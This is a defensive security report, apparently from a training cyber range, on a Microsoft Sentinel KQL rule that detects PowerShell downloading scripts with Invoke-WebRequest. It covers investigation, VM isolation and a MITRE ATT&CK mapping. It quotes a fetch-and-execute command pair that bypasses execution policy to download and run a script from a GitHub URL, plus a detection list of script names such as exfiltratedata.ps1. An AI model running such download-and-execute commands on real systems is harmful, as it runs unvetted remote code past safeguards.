# 🛡️ PowerShell Suspicious Web Request Detection Report

**Author:** Emran Hossain  
**Date:** 2025-10-30  
**Detection Source:** Microsoft Sentinel (Log Analytics Scheduled Query Rule)  
**Device Involved:** `windows-10-emra`

---

## 🔍 Detection Objective
Design and implement a **Sentinel Scheduled Query Rule** in **Log Analytics** to detect when **PowerShell (`powershell.exe`) uses `Invoke-WebRequest`** to download content — an activity often associated with script-based malware delivery or data exfiltration.

---

## 🧠 Analytic Query – Initial Detection
```kql
let targetDeviceName = "windows-10-emra";
DeviceProcessEvents
| where DeviceName == targetDeviceName
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "eicar.ps1"
| order by TimeGenerated
```
<img width="1717" height="332" alt="image" src="https://github.com/user-attachments/assets/bfb85ba8-b475-4790-83a2-577a922a03fd" />

---

## ⚙️ Sentinel Analytic Rule Configuration

| Setting | Value |
|----------|--------|
| **Name** | PowerShell Suspicious Web Request |
| **Description** | Detects PowerShell executions using Invoke-WebRequest to download content. |
| **Enabled** | ✅ Yes |
| **Query Frequency** | Every 4 hours |
| **Query Period** | Last 24 hours |
| **Stop Query After Alert Generated** | ✅ Yes |
| **Incident Creation** | Automatically create an incident when triggered |
| **Incident Grouping** | Group all alerts into a single incident per 24 hours |

### **Entity Mappings**
| Entity | Identifier | Value |
|--------|-------------|-------|
| **Account** | Name | `AccountName` |
| **Host** | HostName | `DeviceName` |
| **Process** | CommandLine | `ProcessCommandLine` |

---

## 🧩 Observed Malicious Behavior
After deploying the analytic rule, a detection was triggered when one of the virtual machines downloaded a **suspicious PowerShell script** using `Invoke-WebRequest`.

### **Detected Commands**
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

**Summary:**  
The host downloaded a PowerShell script from GitHub (`eicar.ps1`) and executed it locally from the `C:\ProgramData` directory — a common pattern for malware staging.

---

## 🧾 Verification – Check for Executed Scripts
A follow-up query was used to determine whether any downloaded scripts were executed on the same host.

```kql
let targetDeviceName = "windows-10-emra";
let scriptName = dynamic(["eicar.ps1","exfiltratedata.ps1","portscan.ps1","pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == targetDeviceName
| where FileName == "powershell.exe"
| where ProcessCommandLine has_any (scriptName) and ProcessCommandLine contains "-File"
| order by TimeGenerated
| project TimeGenerated, AccountName, ActionType, DeviceName, ProcessCommandLine, FileName
```
<img width="1715" height="603" alt="image" src="https://github.com/user-attachments/assets/f77fcbb5-d9b7-47fb-9620-c90107cbdb8d" />

### **Results**
Three executions of PowerShell were detected running the suspicious scripts:
```
2025-10-30T15:29:10.349735Z  
2025-10-30T15:33:29.6862858Z  
2025-10-30T15:45:48.7271427Z
```

**Action Taken:**  
The virtual machine (`windows-10-emra`) was immediately **isolated** from the network to prevent further spread.  
While isolated, a **full antimalware scan** was initiated within **Microsoft Defender for Endpoint (MDE)** to verify whether any malicious payloads or persistence mechanisms were present.

---

## ⚔️ MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID | Description |
|---------|------------|---------------|--------------|
| **Execution** | Command and Scripting Interpreter: PowerShell | **T1059.001** | Adversaries use PowerShell to execute arbitrary commands or scripts. |
| **Command and Control** | Ingress Tool Transfer | **T1105** | `Invoke-WebRequest` used to transfer tools or payloads from external servers. |
| **Execution** | User Execution: Malicious File | **T1204.002** | Execution of downloaded PowerShell scripts (e.g., `eicar.ps1`). |
| **Defense Evasion (Possible)** | Obfuscated Files or Information | **T1027** | PowerShell scripts may contain obfuscated or encoded payloads. |

---

## 🧩 Findings Summary
- PowerShell activity detected on `windows-10-emra` utilizing `Invoke-WebRequest` to download external content.  
- Scripts (`eicar.ps1`, `exfiltratedata.ps1`, `portscan.ps1`, `pwncrypt.ps1`) were executed locally.  
- System was isolated for containment.  
- MDE antimalware scan initiated post-isolation.

---

## 🧰 Recommended Actions
1. **Containment**
   - Keep the VM isolated until malware scan results confirm system integrity.
2. **Investigation**
   - Review all outbound network connections from the host before isolation.
   - Examine PowerShell logs (Script Block Logging, Module Logging) for encoded or obfuscated payloads.
3. **Eradication**
   - Remove any suspicious scripts and executables found in `C:\ProgramData\`.
4. **Recovery**
   - Patch and update the host, verify user account credentials, and re-enable network connectivity after clearance.
5. **Hardening**
   - Enforce PowerShell Constrained Language Mode.
   - Enable Application Control or AppLocker policies.
   - Create additional Sentinel rules for `DownloadString`, `Start-BitsTransfer`, or `curl` usage.

---

## ✅ Conclusion
The Sentinel analytic rule successfully detected malicious PowerShell behavior associated with **MITRE ATT&CK techniques T1059.001 and T1105**.  
The rapid response—query correlation, isolation, and scanning—prevented potential lateral movement and data exfiltration.

